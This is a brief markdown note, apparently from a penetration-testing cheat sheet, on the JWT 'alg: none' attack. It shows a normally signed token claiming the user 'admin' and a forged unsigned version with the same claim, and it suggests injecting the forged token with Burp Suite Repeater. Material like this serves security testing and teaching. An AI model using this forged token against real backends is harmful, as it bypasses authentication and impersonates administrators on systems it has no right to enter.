# JWT `alg: none` Exploit

If a backend accepts JWTs with `alg: none`, we can forge our own.

---

## Original Token (with secret signing):
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VyIjoiYWRtaW4ifQ.
<valid_signature>

## Forged Token (no signature needed):
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.
eyJ1c2VyIjoiYWRtaW4ifQ.

> Use Burp Suite Repeater or browser extension to inject this forged token.